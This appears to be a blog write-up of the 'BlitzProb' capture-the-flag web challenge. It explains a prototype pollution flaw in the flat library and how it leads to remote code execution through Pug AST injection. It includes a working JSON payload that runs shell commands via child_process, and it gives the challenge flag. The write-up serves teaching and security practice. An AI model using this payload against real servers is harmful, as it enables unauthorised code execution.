---
title: BlitzProb
date: 2021-04-25 10:13:00 +0200
categories: [web]
tags: [cyberapocalpyse2021]
toc: false
---

This challenge contains a _Prototype Pollution_ to RCE via _AST Injection_. You can read more about it in this great [blog](https://blog.p6.is/AST-Injection/) post. (\* ^ ω ^)

Upon visiting the entry point, we are greeted with a aesthetic, futuristic looking feedback form. We are provided with a list of songs from a famous alien band named __Blitz Prop__ and asked to choose our favorite.
![](/assets/img/blitzProb_web.png#center)

## Vulnerability
If we go through the source code, we can see in the file `routes/index.js` that the `unflatten` function is the only thing processing our input. It turns the JSON that is send to it back into an object. What if we could write or overwrite other items in Node's object space?

The vulnerable code of the challenge:

``` javascript
const path              = require('path');
const express           = require('express');
const pug               = require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
	const { song } = unflatten(req.body);

	if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the name of an existing song.'
		});
	}
});

module.exports = router;
```

After reviewing the `package.json` file we can see that "flat" “5.0.0” is installed, which suffers from a _Prototype Pollution_ vulnerability. [Here](https://github.com/hughsk/flat/issues/105) you can find the PoC. 

How do we exploit this? There are no _if_ branches to bypass in the code. The default object space only has functions to overwrite, but since we can only submit valid JSON, we cannot define our own functions.

**Note:** This is because function definitions are not valid JSON. You can overwrite a function with a payload such as `{ 'Object.__proto__.toString': '() => return "Foo"' }` but it will eventually break everything, as a critical _function_ has now been redefined as a _string_.

We can achieve RCE if we can find an `exec()` or `eval()` statement anywhere in our application. Maybe Pug?

The `pug.compile` function converts a _string_ into a template _function_ and passes the _object_ for reference. It is a method to check the use of pug template engine in a black-box environment using prototype pollution.

When we insert AST into the `Object.prototype.block`, the compiler adds it to the buffer by referring to the value... (be sure to read the previously mentioned blog for a detailed explanation)... AST generated by `pug-parser` is passed to the `pug-code-gen` and made into a function and finally, it will be executed.

## Exploitation
To exploit this vulnerability and read the flag, we simply open the web console and send the payload below to "/api/submit":

```javascript
let CMD = "process.mainModule.require('child_process').execSync('cat /app/flag* >> /app/static/flag.txt')"

fetch('/api/submit', {
	method: 'POST',
	body: JSON.stringify({
		'song.name': "Not Polluting with the boys",
		"__proto__.block": {
			"type": "Text", 
			"line": CMD
		}
	}),
	headers: {'Content-Type': 'application/json'}
})
```

The flag file has been written to the _static_ directory (the only place where we have write access). After visiting `static/flag.txt` we see the flag:

> CHTB{p0llute_with_styl3}

٩(◕‿◕｡)۶